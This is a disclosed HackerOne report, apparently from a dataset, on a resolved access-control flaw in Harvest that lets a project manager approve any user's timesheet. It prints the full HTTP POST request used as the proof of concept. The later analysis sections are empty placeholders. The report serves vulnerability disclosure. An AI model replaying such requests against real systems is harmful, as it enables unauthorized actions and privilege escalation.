---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '164515'
original_report_id: '164515'
title: Project Manager can approve pending reports(Access control Issue)
weakness: Privilege Escalation
team_handle: harvest
created_at: '2016-08-30T18:44:00.123Z'
disclosed_at: '2017-08-17T20:50:15.030Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- privilege-escalation
---

# Project Manager can approve pending reports(Access control Issue)

## Metadata

- HackerOne Report ID: 164515
- Weakness: Privilege Escalation
- Program: harvest
- Disclosed At: 2017-08-17T20:50:15.030Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

Description : Project manager can't access the Pending approval section of Timesheet. So he should not be able to approve any reports of any user. But the approve report is working for project manager and he is able to approve reports of any user.

Vulnerable HTTP request : 

POST /approve/finalize HTTP/1.1
Host: vijaygangani.harvestapp.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://vijaygangani.harvestapp.com/entry/approve/242/2016:/1362860
Cookie: [Cookie_Values]
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 225

utf8=%E2%9C%93&authenticity_token=&user_id=1362860&period_start=242&period_start_year=2016&from_page=0&commit=Approve+Timesheet

Send this request from project manager's account and he the reports of mentioned user will be approved by project manager. 

Let me know if you need any help from my side.


Best Regards !
Vijay Kumar

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
